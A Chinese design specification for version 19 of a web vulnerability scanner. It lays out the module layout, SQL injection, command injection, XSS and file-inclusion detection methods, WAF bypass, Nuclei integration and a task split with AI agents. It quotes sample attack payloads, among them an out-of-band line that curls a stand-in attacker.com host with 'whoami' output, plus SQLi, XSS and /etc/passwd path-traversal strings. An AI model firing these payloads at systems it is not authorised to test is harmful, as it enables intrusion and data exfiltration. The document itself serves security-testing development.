# WVS v19 重构规范书

## 一、项目定位

**目标：** 打造真正实用的 Web 漏洞扫描工具，不是 Demo，不是 POC，而是能实际渗透工作中拿来就用的家伙。

**核心原则：**
- 质量 > 速度 > 功能数量
- 每一条检测规则都必须经过实战验证
- 误报率必须 < 5%，否则没人会用
-宁可少检测一个漏洞，也不报告一个假漏洞

---

## 二、v18 核心痛点（必须全部解决）

| # | 痛点 | v18 表现 | v19 解决方案 |
|---|---|---|---|
| 1 | 架构混乱 | scanner_v18.py + full_scanner.py + 重复 Vulnerability 类 | 统一数据模型 + 清晰模块边界 |
| 2 | 双重请求 bug | validation_enhancer 每次循环发 2 个请求，浪费 50% | 只发 1 个请求，计时准确 |
| 3 | 计时逻辑错误 | async with 在请求完成后才计时 | 先开始计时，再发请求 |
| 4 | 误报率高 | CMDi "NoneType" 误报，无 baseline 对比 | 必须有 baseline 对比，token 回显验证 |
| 5 | Nuclei 是模拟 | nuclei_manager.py 模拟输出，没调用真实 CLI | 真实调用 `C:\Tools\nuclei\nuclei.exe`，fallback 模拟 |
| 6 | WAF bypass 不实用 | payloads 库大而空，实际碰 WAF 仍然死 | WAF bypass 只做核心 3-5 种：SQLi/XSS/CMDi，低调模式 |
| 7 | 重试逻辑缺失 | 请求失败直接跳过 | httpx retry=3 + exponential backoff |
| 8 | 速率控制有名无实 | intelligent_rate_limiter.py 存在但未集成 | 每个模块独立 rate limit，超限自动退让 |
| 9 | 爬虫形同虚设 | 爬不到动态 JS 页面，链接采集不完整 | 分层爬取：静态解析 + Playwright JS 渲染 |
| 10 | 模块耦合严重 | sqli/cmdi/xss 逻辑全写在主文件里 | 完全模块化，每种漏洞独立模块 |
| 11 | 报告太水 | JSON 凑合，HTML 根本没法看 | 分级报告：简报（控制台）+ 详细 HTML + 导出 JSON |

---

## 三、v19 架构设计

```
wvs/
├── core/                      # 核心引擎
│   ├── __init__.py
│   ├── scanner.py            # 主扫描器（协调所有模块）
│   ├── crawler.py            # 分层爬虫（静态 + Playwright）
│   ├── validator.py          # 统一验证引擎
│   ├── deduplicator.py       # 漏洞去重
│   └── session.py            # HTTP Session 管理（retry + rate limit 内置）
├── modules/                   # 检测模块（核心资产）
│   ├── base.py              ✅ 已完成
│   ├── sqli/
│   │   ├── __init__.py
│   │   ├── detector.py       # SQL 注入检测（union / boolean-blind / time-based / error-based）
│   │   └── payloads.py       # SQLi payloads（实测有效，分 WAF bypass / normal）
│   ├── cmdi/
│   │   ├── __init__.py
│   │   ├── detector.py       # 命令注入检测（OOB / blind / echo 回显）
│   │   └── payloads.py       # CMDi payloads
│   ├── xss/
│   │   ├── __init__.py
│   │   ├── detector.py       # XSS 检测（reflected / stored / DOM）
│   │   └── payloads.py       # XSS payloads
│   ├── lfi/
│   │   ├── __init__.py
│   │   ├── detector.py       # 本地文件包含检测
│   │   └── payloads.py       # LFI payloads + /proc/self/environ 等
│   ├── rce/
│   │   ├── __init__.py
│   │   └── detector.py       # RCE 检测
│   └── sensitive/
│       ├── __init__.py
│       └── detector.py       # 敏感信息泄露（debug page / backup / config）
├── integrations/
│   ├── nuclei_integration.py # 真实调用 nuclei.exe
│   └── nuclei/
│       └── templates/        # 自定义 nuclei 模板
├── plugins/                  # 插件扩展
│   ├── __init__.py
│   └── auth.py               # 认证插件（表单登录 / Cookie / Bearer Token）
├── reporting/
│   ├── __init__.py
│   ├── console.py           # 控制台报告（实时输出）
│   ├── json_exporter.py     # JSON 导出
│   └── html_report.py       # HTML 报告（好看的）
└── wvs.py                   # CLI 入口

wvs-v19/
├── scripts/                  # 实用脚本
│   ├── quick_scan.py        # 快速扫描单目标
│   ├── batch_scan.py        # 批量扫描
│   └── install_deps.ps1     # 自动安装依赖
└── tests/                   # 测试套件
```

---

## 四、核心模块详细规格

### 4.1 Session 管理（core/session.py）
- 使用 `httpx.AsyncClient`，全局单例
- retry=3，backoff: 1s → 2s → 4s
- 每个域名独立 rate limit：默认 10 req/s
- 自动跟随重定向
- 支持 Cookie 持久化
- 请求超时：默认 30s，可按模块覆盖

### 4.2 SQLi 检测（modules/sqli/detector.py）
**检测方法（优先级从高到低）：**
1. **Error-based** — 构造会让 DB 报错的 payload，检测响应中的 SQL 错误信息
2. **Union-based** — ` UNION SELECT NULL--` 系列，检测列数匹配
3. **Boolean-blind** — `' AND 1=1--` vs `' AND 1=2--`，对比响应差异
4. **Time-based blind** — `'; SLEEP(N)--`，时间差 > N 秒则确认

**验证（必须做）：**
- 每个检测到的问题都必须用**不同 payload 二次验证**
- Time-based 必须做 baseline 对比（原始响应时间 vs payload 响应时间）
- 置信度分级：LOW（单次检测）/ MEDIUM（2种方法确认）/ HIGH（3种方法确认）/ CERTAIN（二次验证通过）

**Payload 库要求：**
- 覆盖 MySQL / PostgreSQL / MSSQL / Oracle / SQLite
- WAF bypass payloads：注释混淆、大小写混合、数字代替字符串
- 每条 payload 标注绕过类型（MySQL注释 / 双重URL编码 / 内联注释）

### 4.3 CMDi 检测（modules/cmdi/detector.py）
**检测方法：**
1. **Echo 回显** — `; echo wvs_test_123456` / `| echo wvs_test_123456`，检测回显
2. **OOB** — `; curl http://attacker.com/?data=whoami`，检测外带
3. **Time-based** — `; sleep N`，时间差验证
4. **Code injection** — `${IFS}` / `$()`

**误报防护（v18 最大痛点）：**
- **必须先发 baseline 请求**获取原始响应
- 比对：baseline 无回显，payload 有回显 → 才是真的
- baseline 有回显（如页面本身含 `whoami`）→ 再用随机 token 验证
- `"NoneType"` / 空响应 → 直接排除，不报告

**Payload 库：**
- Linux: `;cmd|` / `&cmd&` / `$(cmd)` / `` `cmd` `` / `${IFS}` / `%0a`
- Windows: `;cmd` / `&cmd&` / `|cmd` / `%ComSpec%`

### 4.4 XSS 检测（modules/xss/detector.py）
**检测方法：**
1. **Reflected** — 在 URL 参数/Body 中注入 `<script>alert(1)</script>`，检测是否原样反射
2. **Stored** — 提交 payload 后刷新页面，检查是否持久化
3. **DOM-based** — 使用 Playwright 检测 JS 变量中的反射

**验证：**
- 短 payload 触发 + 长 payload 触发，双重确认
- 检测 HTML 编码 / URL 编码绕过

### 4.5 LFI 检测（modules/lfi/detector.py）
- `/etc/passwd` / `C:\Windows\win.ini` 等常见文件
- `/proc/self/environ` / `/proc/self/fd/...`
- Null byte injection (`%00`)
- 路径遍历：`../` 循环检测
- 验证：读取文件内容必须包含预期特征字符串

### 4.6 Nuclei 集成（integrations/nuclei_integration.py）
**严格遵循：**
```python
# 真实 CLI 调用，失败则 fallback 到内置模板
if nuclei_exe_exists():
    result = subprocess.run([NUCLEI_PATH, '-u', url, '-json', ...], capture_output=True)
    parse_json_output(result.stdout)
else:
    use_internal_templates()  # 内置 fallback
```
- 禁止伪造 nuclei 输出
- 支持自定义 nuclei 模板目录

### 4.7 WAF 检测与绕过
- 检测阶段：在正常请求后立即检查 WAF 响应头/响应体特征
- 识别 15+ 常见 WAF（Cloudflare / AWS WAF / ModSecurity / 阿里云等）
- 识别后自动切换 bypass payloads（降低请求频率 + 使用混淆 payload）
- bypass payload 数量：SQLi 5条、XSS 5条、CMDi 3条

---

## 五、CLI 接口设计

```bash
# 快速扫描
python wvs.py scan http://target.com

# 带认证扫描
python wvs.py scan http://target.com --auth-form --username admin --password admin

# 指定模块
python wvs.py scan http://target.com --modules sqli cmdi xss --no-modules lfi

# 批量扫描
python wvs.py batch targets.txt --threads 5

# 输出
python wvs.py scan http://target.com -o report.json --format json
python wvs.py scan http://target.com -o report.html --format html
python wvs.py scan http://target.com --verbose  # 实时控制台输出

# 其他
python wvs.py --list-modules          # 列出所有模块
python wvs.py --version               # 版本信息
```

---

## 六、质量门槛

| 指标 | 门槛 |
|---|---|
| 误报率 | < 5%（每个报告的漏洞必须有二次验证） |
| 漏报率（对比已知漏洞） | 目标靶机已知漏洞必须能检测到 |
| 单目标扫描时间 | < 5 分钟（简单目标） |
| 崩溃率 | 0%（异常必须被捕获，不丢任务） |
| 代码覆盖率 | 核心模块 > 80% |

---

## 七、任务分配

**18789 agent：** 负责核心引擎层（core/）
**我（代可行）：** 负责检测模块（modules/）
**Claude Code（按需）：** 负责 review 和架构决策

---

## 八、开发顺序（必须按顺序）

### Phase 1：打地基（当前状态）
- [x] models.py
- [x] config.py
- [x] modules/base.py
- [x] exceptions.py
- [x] **core/session.py** ✅ 18789
- [x] **core/crawler.py** ✅ 18789
- [x] **core/scanner.py** ✅ 18789

### Phase 2：核心检测模块
- [ ] modules/sqli/detector.py + payloads.py
- [ ] modules/cmdi/detector.py + payloads.py
- [ ] modules/xss/detector.py
- [ ] modules/lfi/detector.py

### Phase 3：增强功能
- [ ] integrations/nuclei_integration.py
- [ ] modules/auth.py
- [ ] reporting/console.py + html_report.py

### Phase 4：集成测试 + 靶机验证
- [ ] 在用户靶机（Kioptrix / zico2 / driftingblues9 等）上验证检测率
- [ ] 误报率测试

---

*最后更新：2026-04-20*
*负责人：代可行 + 18789 agent + Claude Code 协同*
